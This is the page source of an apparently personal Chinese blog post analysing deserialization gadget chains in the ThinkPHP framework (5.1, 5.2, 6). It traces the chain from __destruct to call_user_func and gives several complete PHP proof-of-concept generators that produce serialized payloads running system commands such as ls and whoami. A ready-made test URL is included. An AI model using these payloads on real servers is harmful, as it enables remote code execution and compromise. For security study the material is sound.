
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Hexo">
    <title>thinkphp反序列化 - Hexo</title>
    <meta name="author" content="John Doe">
    
    
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"目录结构12345678910111213141516171819202122232425262728293031323334353637383940414243444546project  应用部署目录├─application           应用目录（可设置）│  ├─common             公共模块目录（可更改）│  ├─index              模块目录(可更改)│  │  ├─config.php      模块配置文件│  │  ├─common.php      模块函数文件│  │  ├─controller      控制器目录│  │  ├─model           模型目录│  │  ├─view            视图目录│  │  └─ ...            更多类库目录│  ├─command.php        命令行工具配置文件│  ├─common.php         应用公共（函数）文件│  ├─config.php         应用（公共）配置文件│  ├─database.php       数据库配置文件│  ├─tags.php           应用行为扩展定义文件│  └─route.php          路由配置文件├─extend                扩展类库目录（可定义）├─public                WEB 部署目录（对外访问目录）│  ├─static             静态资源存放目录(css,js,image)│  ├─index.php          应用入口文件│  ├─router.php         快速测试文件│  └─.htaccess          用于 apache 的重写├─runtime               应用的运行时目录（可写，可设置）├─vendor                第三方类库目录（Composer）├─thinkphp              框架系统目录│  ├─lang               语言包目录│  ├─library            框架核心类库目录│  │  ├─think           Think 类库包目录│  │  └─traits          系统 Traits 目录│  ├─tpl                系统模板目录│  ├─.htaccess          用于 apache 的重写│  ├─.travis.yml        CI 定义文件│  ├─base.php           基础定义文件│  ├─composer.json      composer 定义文件│  ├─console.php        控制台入口文件│  ├─convention.php     惯例配置文件│  ├─helper.php         助手函数文件（可选）│  ├─LICENSE.txt        授权说明文件│  ├─phpunit.xml        单元测试配置文件│  ├─README.md          README 文件│  └─start.php          框架引导文件├─build.php             自动生成定义文件（参考）├─composer.json         composer 定义文件├─LICENSE.txt           授权说明文件├─README.md             README 文件├─think                 命令行入口文件\n\ntp5.1__destruct全局搜索一下__destruct \n在windows.php中找到一个__destruct，貌似可用\n12345public function __destruct()&#123;    $this-&gt;close();    $this-&gt;removeFiles();&#125;\n\n调用removeFiles()方法，跟进removeFiles()\n123456789private function removeFiles()&#123;    foreach ($this-&gt;files as $filename) &#123;        if (file_exists($filename)) &#123;            @unlink($filename);        &#125;    &#125;    $this-&gt;files = [];&#125;\n\n有file_exists() 可以触发__toString\n__toString全局搜索一下__toString \n1234public function __toString()&#123;    return $this-&gt;toJson();&#125;\n\n跟进toJson()\n1234public function toJson($options = JSON_UNESCAPED_UNICODE)&#123;    return json_encode($this-&gt;toArray(), $options);&#125;\n\n继续跟进toArray() 在192行代码处，有一个调用类的方法，可以触发__call \n12345678910if (!empty($this-&gt;append)) &#123;    foreach ($this-&gt;append as $key =&gt; $name) &#123;        if (is_array($name)) &#123;            // 追加关联对象属性            $relation = $this-&gt;getRelation($key);            if (!$relation) &#123;                $relation = $this-&gt;getAttr($key);                $relation-&gt;visible($name);            &#125;\n\n看看变量是否可控\n$this-&gt;append 一个数组，对象的属性 ，可控  \n往下走 \n有一个is_array($name)的判断，让$this-&gt;append中的值为数组就可以\n下面会调用getRelation($key)   跟进\n1234567891011#RelationShip.php    public function getRelation($name = null)    &#123;        if (is_null($name)) &#123;            return $this-&gt;relation;        &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123;            return $this-&gt;relation[$name];        &#125;        return;    &#125;\n\n因为上面有if (!$relation)  所以这里返回空就好 return;\n继续往下走，调用了$this-&gt;getAttr($key)，跟进getAttr()\n123456#Attribute.phppublic function getAttr($name, &amp;$item = null) &#123;     try &#123;         $notFound = false;         $value    = $this-&gt;getData($name);\n\n跟进getData\n123456789public function getData($name = null)&#123;    if (is_null($name)) &#123;        return $this-&gt;data;    &#125; elseif (array_key_exists($name, $this-&gt;data)) &#123;        return $this-&gt;data[$name];    &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123;        return $this-&gt;relation[$name];    &#125;\n\n$this-&gt;data可控，\n能够调用到$relation-&gt;visible($name)了;  去找一下__call\n__call全局搜索一下__call\n123456public function __call($method, $args)&#123;    if (array_key_exists($method, $this-&gt;hook)) &#123;        array_unshift($args, $this);        return call_user_func_array($this-&gt;hook[$method], $args);    &#125;\n\n__call方法内有一个call_user_array函数 可以用来执行代码，但是这里的$args经过了array_unshift，第一个参数变成了$this，\n现在回看一下 那些是可控的\n1234567Conversion  append可控 Attribute   data可控 $relation-&gt;visible($name)可控$this-&gt;hook[$method]可控\n\n分析代码执行位置$arg参数被固定，所以要找一个不受$arg参数影响的方法\n参考tp5的执行RCE 有一个比较常见的位置filter\n12345678private function filterValue(&amp;$value, $key, $filters)&#123;    $default = array_pop($filters);    foreach ($filters as $filter) &#123;        if (is_callable($filter)) &#123;            // 调用函数或者方法过滤            $value = call_user_func($filter, $value);\n\n这里调用了call_user_func，貌似可以RCE\n但是直接把 hook[‘method’] 赋值filterValue   那么$value对应的就是$arg  不可控， 再找找\n找一下哪里调用了filterValue方法，\ninput()\n12345678910111213141516171819public function input($data = [], $name = '', $default = null, $filter = '')    &#123;\t\t\t...\t\t\t...            $data = $this-&gt;getData($data, $name);\t\t\t...\t\t\t...        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) &#123;            array_walk_recursive($data, [$this, 'filterValue'], $filter);            if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) &#123;                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针                $this-&gt;arrayReset($data);            &#125;        &#125; else &#123;            $this-&gt;filterValue($data, $name, $filter);        &#125;\n\n乍一看data不可控，再往下看看\n先是经过了$this-&gt;getData  $this-&gt;getFilter\n跟进一下\n123456789101112protected function getData(array $data, $name)&#123;    foreach (explode('.', $name) as $val) &#123;        if (isset($data[$val])) &#123;            $data = $data[$val];        &#125; else &#123;            return;        &#125;    &#125;    return $data;&#125;\n\n这里直接$data = $data[$val]; 然后return $data;  $data可控了 \n但是如果直接把hook[$method]直接赋值为input，name就不可控了，$data的赋值和name还有关系explode(&#39;.&#39;, $name) as $val\n不行  再找一下哪里调用了input方法，能不能控制name参数\nparam方法\n1234567891011121314151617181920public function param($name = '', $default = null, $filter = '')    &#123;\t\t\t...            // 当前请求参数和URL地址中的参数合并            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));            $this-&gt;mergeParam = true;        &#125;        if (true === $name) &#123;            // 获取包含文件上传信息的数组            $file = $this-&gt;file();            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;            return $this-&gt;input($data, '', $default, $filter);        &#125;        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    &#125;\n\nreturn $this-&gt;input($this-&gt;param, $name, $default, $filter);\n$this-&gt;param 是$_GET数组传过来的值，可控 \n但name不可控，这里的$name 接收的是$arg传来的参数，因为$arg不可控，所以$name同样不可控，继续找哪里调用了param方法\nisAjax方法\n12345678910111213public function isAjax($ajax = false)&#123;    $value  = $this-&gt;server('HTTP_X_REQUESTED_WITH');    $result = 'xmlhttprequest' == strtolower($value) ? true : false;    if (true === $ajax) &#123;        return $result;    &#125;    $result           = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result;    $this-&gt;mergeParam = false;    return $result;&#125;\n\n$this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result;\n把$this-&gt;config[‘var_ajax’]传给param的name参数，这样name就可控了\n往下看 控制filter参数\n1234567891011121314151617protected function getFilter($filter, $default)&#123;    if (is_null($filter)) &#123;        $filter = [];    &#125; else &#123;        $filter = $filter ?: $this-&gt;filter;        if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) &#123;            $filter = explode(',', $filter);        &#125; else &#123;            $filter = (array) $filter;        &#125;    &#125;    $filter[] = $default;    return $filter;&#125;\n\n看这里$filter = $filter ?: $this-&gt;filter;   $filter可控\n现在调用filterValue方法的参数都已经可控了 $data $filter\n1array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);\n\nPOC\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123;    protected $append = [];    private $data = [];    function __construct()&#123;        $this-&gt;append = [\"xxx\"=&gt;[\"calc.exe\",\"calc\"]];        $this-&gt;data = [\"xxx\"=&gt;new Request()];    &#125;&#125;class Request&#123;    protected $hook = [];    protected $filter = \"system\";    protected $config = [        // 表单ajax伪装变量        'var_ajax'         =&gt; '_ajax',      ];    function __construct()&#123;        $this-&gt;filter = \"system\";        $this-&gt;config = [\"var_ajax\"=&gt;'xxx'];        $this-&gt;hook = [\"visible\"=&gt;[$this,\"isAjax\"]];    &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123;    private $files = [];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt;\n\n在public/index.php加一个触发点\n12$str=base64_decode($_GET['str']);unserialize($str);\n\n测试\n1http://127.0.0.1/tp5/public/?str=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19&amp;xxx=calc\n\n计算器会弹出来\n收获看了很长时间，很多遍才看了个差不多\nNo.1  反序列化找可控变量，像$this-&gt;key这种的变量，可控的几率较大，因为是类的属性，可以直接通过反序列化得到\nNo.2  几个函数的用法，call_user_func_array可以调用类的方法\n123456789class foo &#123;    function bar($arg, $arg2) &#123;        echo __METHOD__, \" got $arg and $arg2\\n\";    &#125;&#125;$foo = new foo;call_user_func_array(array($foo, \"bar\"), array(\"three\", \"four\"));等效于$foo-&gt;bar(\"three\",\"four\")\n\nNo.3  \n反序列化常用的魔法函数\n123456789101112131415__call\t调用不可访问或不存在的方法时被调用__callStatic\t调用不可访问或不存在的静态方法时被调用__clone\t进行对象clone时被调用，用来调整对象的克隆行为__constuct\t构建对象的时被调用；__debuginfo\t当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本__destruct\t明确销毁对象或脚本结束时被调用；__get\t读取不可访问或不存在属性时被调用__invoke\t当以函数方式调用对象时被调用__isset\t对不可访问或不存在的属性调用isset()或empty()时被调用__set\t当给不可访问或不存在属性赋值时被调用__set_state\t当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。__sleep\t当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用__toString\t当一个类被转换成字符串时被调用__unset\t对不可访问或不存在的属性进行unset时被调用__wakeup\t当使用unserialize时被调用，可用于做些对象的初始化操作\n\n反序列化常见起点\n12345__wakeup 一定会调用__destruct 一定会调用__toString 当一个对象被反序列化后又被当做字符串使用\n\n反序列化常见跳板\n1234567__toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用isset()或empty()时被调用\n\n反序列化常见终点\n12345__call 调用不可访问或不存在的方法时被调用call_user_func 一般php代码执行都会选择这里call_user_func_array 一般php代码执行都会选择这里\n\nNo.4 几个可以触发__tostring的方式\n12345678910111213echo $foo  print $foo 输出file_exists($f00)  文件判断&apos;name&apos;.$foo  &quot;name is &#123;$foo&#125;&quot;字符串连接sprintf(&quot;I am %s&quot;,$foo) 格式化字符串if($foo==&apos;admin&apos;)  字符串比较格式化sql语句，绑定参数会被调用in_array($foo,[&apos;admin&apos;,&apos;guest&apos;]) 数组中有字符，产生字符判断的时候\n\nNo.5\n1array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);\n\n参考链接\n https://wulidecade.cn/2019/10/06/tp5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ \n https://xz.aliyun.com/t/6619#toc-1 \nhttps://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/\nTP5.2poc112345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace think\\process\\pipes &#123;    class Windows    &#123;        private $files;        public function __construct($files)        &#123;            $this-&gt;files = [$files];        &#125;    &#125;&#125;namespace think\\model\\concern &#123;    trait Conversion    &#123;        &#125;    trait Attribute    &#123;        private $data;        private $withAttr = [\"lin\" =&gt; \"system\"];        public function get()        &#123;            $this-&gt;data = [\"lin\" =&gt; \"ls\"];        &#125;    &#125;&#125;namespace think &#123;    abstract class Model    &#123;        use model\\concern\\Attribute;        use model\\concern\\Conversion;    &#125;&#125;namespace think\\model&#123;    use think\\Model;    class Pivot extends Model    &#123;        public function __construct()        &#123;            $this-&gt;get();        &#125;    &#125;&#125;namespace &#123;    $conver = new think\\model\\Pivot();    $payload = new think\\process\\pipes\\Windows($conver);    echo urlencode(serialize($payload));&#125;?&gt;\n\npoc212345678910111213141516171819202122232425262728293031323334353637&lt;?phpnamespace think;require __DIR__ . '/vendor/autoload.php';use Opis\\Closure\\SerializableClosure;abstract class Model&#123;    private $data = [];    private $withAttr = [];    function __construct()&#123;        $this-&gt;data = [\"lin\"=&gt;''];        # withAttr中的键值要与data中的键值相等        $this-&gt;withAttr = ['lin'=&gt; new SerializableClosure(function()&#123;system('ls');&#125;) ];    &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;namespace think\\process\\pipes;use think\\model\\Pivot;class Windows&#123;    private $files = [];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;echo urlencode(serialize(new Windows()));?&gt;\n\npoc3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpnamespace think;class App&#123;    protected $runtimePath;    public function __construct(string $rootPath = '')&#123;        $this-&gt;rootPath = $rootPath;        $this-&gt;runtimePath = \"D:/phpstudy/PHPTutorial/WWW/thinkphp/tp5.2/\";        $this-&gt;route = new \\think\\route\\RuleName();    &#125;&#125;class Db&#123;    protected $connection;    protected $config;    function __construct()&#123;        $this-&gt;config = ['query'=&gt;'\\think\\Url'];        $this-&gt;connection = new \\think\\App();    &#125;&#125;abstract class Model&#123;    protected $append = [];    private $data = [];    function __construct()&#123;        # append键必须存在，并且与$this-&gt;data相同        $this-&gt;append = [\"lin\"=&gt;[]];        $this-&gt;data = [\"lin\"=&gt;new \\think\\Db()];    &#125;&#125;namespace think\\route;class RuleName&#123;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;namespace think\\process\\pipes;use think\\model\\Pivot;class Windows&#123;    private $files = [];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;//var_dump(new Windows());echo urlencode(serialize(new Windows()));?&gt;\n\nTP6poc112345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace think&#123;    class Db&#123;    &#125;&#125;namespace think\\model\\concern &#123;    trait Conversion&#123;        protected $visible;    &#125;    trait RelationShip&#123;        private $relation;    &#125;    trait Attribute&#123;        private $withAttr;        private $data;    &#125;&#125;namespace think&#123;    abstract class Model&#123;        use model\\concern\\Conversion;        use model\\concern\\Attribute;        private $lazySave;        private $exists;        protected $name;        protected $db;        protected $connection;        function __construct($data,$obj)        &#123;                          $this-&gt;lazySave=true;            $this-&gt;exists=true;            $this-&gt;data=$data;            $this-&gt;db=$obj;            $this-&gt;relation = [];            $this-&gt;visible= [];            $this-&gt;name=$this;            $this-&gt;withAttr = array(\"paper\"=&gt;'system');            $this-&gt;connection = [\"type\"=&gt;\"mysql\"];                    &#125;    &#125;&#125;namespace think\\model&#123;    class Pivot extends \\think\\Model&#123;        public function __construct($data,$obj)        &#123;            parent::__construct($data,$obj);        &#125;    &#125;&#125;namespace&#123;    $db = new think\\Db();    $pivot2 = new think\\model\\Pivot(['paper'=&gt;'ls'],$db);    echo urlencode(serialize($pivot2));&#125;\n\npoc212345678910111213141516171819202122232425262728293031323334353637&lt;?phpnamespace think;require __DIR__ . '/vendor/autoload.php';use Opis\\Closure\\SerializableClosure;abstract class Model&#123;    private $lazySave ;    private $exists ;    private $suffix;    protected $append = [];    private $data = [];    protected $visible = [];    private $withAttr = [];    function __construct($aaa)&#123;        //withAttr中的键值要与data中的键值相等        if ($aaa == null)&#123;            $this-&gt;data = [\"huha\"=&gt;''];            $this-&gt;withAttr = ['huha'=&gt; new SerializableClosure(function()&#123;system('whoami');&#125;) ];        &#125;else&#123;            $this-&gt;data = [1];            $this-&gt;lazySave =true;            $this-&gt;exists = true;            $this-&gt;suffix = $aaa;        &#125;    &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;    public function __construct($aaa)&#123;        parent::__construct($aaa);    &#125;&#125;$pivot1 = new Pivot(null);$pivot2 = new Pivot($pivot1);$a = base64_encode(serialize($pivot2));echo $a;\n\n需要放在网站根目录下运行，因为有vendor/autoload.php\npoc31234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpnamespace think\\model\\concern;trait Conversion&#123;&#125;trait Attribute&#123;    private $data;    private $withAttr = [\"axin\" =&gt; \"system\"];    public function get()    &#123;        $this-&gt;data = [\"axin\" =&gt; \"cat /flag\"];  //你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可    &#125;&#125;namespace think;abstract class Model&#123;    use model\\concern\\Attribute;    use model\\concern\\Conversion;    private $lazySave = false;    protected $withEvent = false;    private $exists = true;    private $force = true;    protected $field = [];    protected $schema = [];    protected $connection='mysql';    protected $name;    protected $suffix = '';    function __construct()&#123;        $this-&gt;get();        $this-&gt;lazySave = true;        $this-&gt;withEvent = false;        $this-&gt;exists = true;        $this-&gt;force = true;        $this-&gt;field = [];        $this-&gt;schema = [];        $this-&gt;connection = 'mysql';    &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;    function __construct($obj='')    &#123;        parent::__construct();        $this-&gt;name = $obj;    &#125;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b));\n\nhttps://www.freebuf.com/column/221939.html\nhttps://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9/\n","dateCreated":"2019-11-13T08:36:49+08:00","dateModified":"2019-12-07T09:41:20+08:00","datePublished":"2019-11-13T08:36:49+08:00","description":"","headline":"thinkphp反序列化","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/11/13/thinkphp反序列化/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/11/13/thinkphp反序列化/"}</script>
    <meta name="description" content="目录结构12345678910111213141516171819202122232425262728293031323334353637383940414243444546project  应用部署目录├─application           应用目录（可设置）│  ├─common             公共模块目录（可更改）│  ├─index              模块目录(可">
<meta property="og:type" content="blog">
<meta property="og:title" content="thinkphp反序列化">
<meta property="og:url" content="http://yoursite.com/2019/11/13/thinkphp反序列化/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="目录结构12345678910111213141516171819202122232425262728293031323334353637383940414243444546project  应用部署目录├─application           应用目录（可设置）│  ├─common             公共模块目录（可更改）│  ├─index              模块目录(可">
<meta property="og:locale" content="zh-cn">
<meta property="og:updated_time" content="2019-12-07T01:41:20.501Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="thinkphp反序列化">
<meta name="twitter:description" content="目录结构12345678910111213141516171819202122232425262728293031323334353637383940414243444546project  应用部署目录├─application           应用目录（可设置）│  ├─common             公共模块目录（可更改）│  ├─index              模块目录(可">
    
    
        
    
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
    <!--STYLES END-->
    

    

    
        
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    

<header id="header" data-behavior="4">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/ "
            aria-label=""
        >
            Hexo
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="打开链接: /#about"
            >
        
        
        </a>
    
</header>

            <!-- Define author's picture -->


<nav id="sidebar" data-behavior="4">
    <div class="sidebar-container">
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="首页"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="分类"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="标签"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="归档"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link open-algolia-search"
                            href="#search"
                            
                            rel="noopener"
                            title="搜索"
                        >
                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">搜索</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="关于"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="http://stackoverflow.com/users"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Stack Overflow"
                        >
                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Stack Overflow</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://facebook.com/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Facebook"
                        >
                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Facebook</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://plus.google.com/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Google Plus"
                        >
                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Google Plus</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://www.linkedin.com/profile/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="LinkedIn"
                        >
                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">LinkedIn</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/mailto"
                            
                            rel="noopener"
                            title="邮箱"
                        >
                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/atom.xml"
                            
                            rel="noopener"
                            title="RSS"
                        >
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="4"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post">
    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title">
            thinkphp反序列化
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2019-11-13T08:36:49+08:00">
	
		    11月 13, 2019
    	
    </time>
    
</div>

    
</div>

    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">project  应用部署目录</span><br><span class="line">├─application           应用目录（可设置）</span><br><span class="line">│  ├─common             公共模块目录（可更改）</span><br><span class="line">│  ├─index              模块目录(可更改)</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         应用公共（函数）文件</span><br><span class="line">│  ├─config.php         应用（公共）配置文件</span><br><span class="line">│  ├─database.php       数据库配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─route.php          路由配置文件</span><br><span class="line">├─extend                扩展类库目录（可定义）</span><br><span class="line">├─public                WEB 部署目录（对外访问目录）</span><br><span class="line">│  ├─static             静态资源存放目录(css,js,image)</span><br><span class="line">│  ├─index.php          应用入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于 apache 的重写</span><br><span class="line">├─runtime               应用的运行时目录（可写，可设置）</span><br><span class="line">├─vendor                第三方类库目录（Composer）</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言包目录</span><br><span class="line">│  ├─library            框架核心类库目录</span><br><span class="line">│  │  ├─think           Think 类库包目录</span><br><span class="line">│  │  └─traits          系统 Traits 目录</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─.htaccess          用于 apache 的重写</span><br><span class="line">│  ├─.travis.yml        CI 定义文件</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─composer.json      composer 定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件（可选）</span><br><span class="line">│  ├─LICENSE.txt        授权说明文件</span><br><span class="line">│  ├─phpunit.xml        单元测试配置文件</span><br><span class="line">│  ├─README.md          README 